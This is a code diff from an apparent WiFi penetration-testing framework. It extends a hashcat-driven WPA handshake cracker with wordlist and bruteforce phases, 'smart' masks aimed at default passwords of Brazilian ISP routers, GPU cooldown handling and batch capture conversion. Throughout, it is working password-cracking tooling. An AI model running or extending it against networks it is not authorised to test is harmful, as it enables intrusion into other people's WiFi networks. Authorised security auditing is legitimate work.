-                "--potfile-disable", "--status", "--status-timer=5",
-                "--quiet",
-                str(hash_path), mask,
-            ] + dev_args + extra
-            print_info(f"  CMD: {' '.join(mask_cmd)}")
-            try:
-                proc = subprocess.Popen(mask_cmd, stdout=subprocess.PIPE,
-                                         stderr=subprocess.STDOUT, text=True, bufsize=1)
-                for line in proc.stdout:
-                    line = line.rstrip()
-                    result.raw_lines.append(line)
-                    if ":" in line and "*" not in line and len(line) < 80:
-                        parts = line.rsplit(":", 1)
-                        if len(parts) == 2 and parts[1].strip():
-                            result.add_found("?", parts[1].strip(), "hashcat-mask")
-                    if bool(self.verbose):
-                        print_info(f"  {line}")
-                proc.wait()
-            except Exception as exc:
-                logger.debug("hashcat mask: %s", exc)
+        _wait_gpu_cooldown(int(self.gpu_temp_retain), slog)
 
-        # Wordlist attack
-        if wordlist.exists():
+        # ── Wordlist phase ───────────────────────────────────────────
+        if attack_flow in ("wordlist", "both") and wordlist.exists():
+            slog.write(f"[WL] {wordlist.name}")
             _run_hashcat(hash_path, wordlist, mode, dev_args, rule_files, result, extra)
-        else:
-            print_warning(f"  Wordlist {wordlist} not found — skipping dictionary attack.")
+            if int(self.cooldown_s) > 0:
+                time.sleep(int(self.cooldown_s))
+
+        # ── Bruteforce / smart mask phase ────────────────────────────
+        if not result.found and attack_flow in ("bruteforce", "both"):
+            mask_list = _resolve_mask_list(
+                essid, str(self.masks).strip(), bool(self.smart_masks),
+            )
+            if mask_list:
+                print_info(f"  Máscaras ({len(mask_list)}): {', '.join(mask_list[:5])}{'…' if len(mask_list) > 5 else ''}")
+                _run_hashcat_mask_chain(
+                    hash_path, mode, mask_list, dev_args, extra,
+                    int(self.mask_runtime_s), int(self.cooldown_s),
+                    int(self.gpu_temp_retain), result, slog, bool(self.verbose),
+                )
+            elif attack_flow == "bruteforce":
+                print_warning("  Nenhuma máscara — defina masks= ou smart_masks=true")
+        elif attack_flow == "bruteforce" and not wordlist.exists():
+            mask_list = _resolve_mask_list(essid, str(self.masks).strip(), bool(self.smart_masks))
+            if mask_list:
+                _run_hashcat_mask_chain(
+                    hash_path, mode, mask_list, dev_args, extra,
+                    int(self.mask_runtime_s), int(self.cooldown_s),
+                    int(self.gpu_temp_retain), result, slog, bool(self.verbose),
+                )
 
     # ------------------------------------------------------------------
     # Auto-order
@@ -1264,18 +1639,27 @@ class Exploit(Exploit):
         print_info("")
         print_info("  Usage: set backend <name>")
         print_info("         set input_file /path/to/handshake.pcapng")
-        print_info("         set wordlist /path/to/wordlist.txt")
+        print_info("         set input_dir /path/to/captures/   (batch)")
+        print_info("         set attack_flow both               (wordlist → smart masks)")
+        print_info("         set convert_only true              (Cap2Hash batch)")
         print_info("         run")
         print_info("")
-        print_info("  Rules: set use_rules true  (applies best64 — 64x more candidates)")
-        print_info("  Mask:  set masks '?d?d?d?d?d?d?d?d'  (8-digit brute-force)")
+        print_info("  Flow:   set attack_flow wordlist|bruteforce|both")
+        print_info("  Masks:  set smart_masks true  (VIVO/CLARO/NET/SSID auto)")
+        print_info("  Thermal: set gpu_temp_abort 80  cooldown_s 60")
+        print_info("  Rules:  set use_rules true")
+        print_info("  Log:    set log_file /tmp/crack.log")
 
     def _show_usage(self) -> None:
         print_info("Quick usage:")
         print_info("  set backend hashcat_gpu")
-        print_info("  set input_file /tmp/wxf_caps/csa_v3.hash")
-        print_info("  set wordlist /path/to/rockyou.txt")
+        print_info("  set input_file /tmp/handshake.pcapng")
+        print_info("  set attack_flow both")
+        print_info("  set wordlist /path/to/wlist_brasil.lst")
         print_info("  run")
+        print_info("")
+        print_info("Cap2Hash batch convert:")
+        print_info("  set input_dir /path/to/pcaps/  convert_only=true  run")
 
     def _print_summary(self, be: str, result: CrackResult) -> None:
         print_info("")
